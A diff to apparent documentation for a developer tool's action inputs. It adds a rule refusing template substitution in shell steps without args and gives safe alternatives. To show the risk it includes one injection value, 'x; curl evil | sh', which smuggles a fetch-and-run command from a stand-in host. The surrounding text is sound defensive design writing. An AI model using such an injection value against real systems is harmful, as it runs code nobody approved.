@@ -136,13 +136,35 @@ default = "staging"
 Rules:
 
 - At most 16 inputs per action; a value is at most 4096 characters.
-- `${input:id}` may appear in `command`, `args`, `cwd`, and `env` values.
+- `${input:id}` may appear in `command`, `args`, `cwd`, and `env` values, with one exception below.
 - Referencing an input that is not declared is an error, and the action does not load.
 - A declared input that nothing references is reported as a diagnostic and dropped.
 - A `string` input with no default is required.
+- A `choice` input with no default takes its first option.
 - Substitution happens when the action runs, never when it is discovered.
   The Run menu preview, the approval dialog, and the trust fingerprint all show the template.
   An input therefore cannot introduce a command a human did not approve.
+
+**The exception: a `shell` step with no `args` cannot carry an input.**
+Its command string is passed to the shell untouched, so repository-authored shell syntax keeps working, and a substituted value would be shell syntax too.
+`command = "git checkout ${input:branch}"` with `branch = "x; curl evil | sh"` would run a second command nobody approved.
+The action does not load, and the diagnostic names the two fixes:
+
+```toml
+# Refused: the value would reach the shell as syntax.
+command = "git checkout ${input:branch}"
+
+# Fine: args are quoted for the target shell.
+command = "git"
+args = ["checkout", "${input:branch}"]
+
+# Also fine: no shell is involved at all.
+type = "process"
+command = "git"
+args = ["checkout", "${input:branch}"]
+```
+
+Everywhere else is already safe: a `process` step's argv goes to the OS verbatim, a `shell` step *with* args has its command and every argument quoted, and `cwd` and `env` are spawn fields rather than shell text.
 
 ## Variables
 
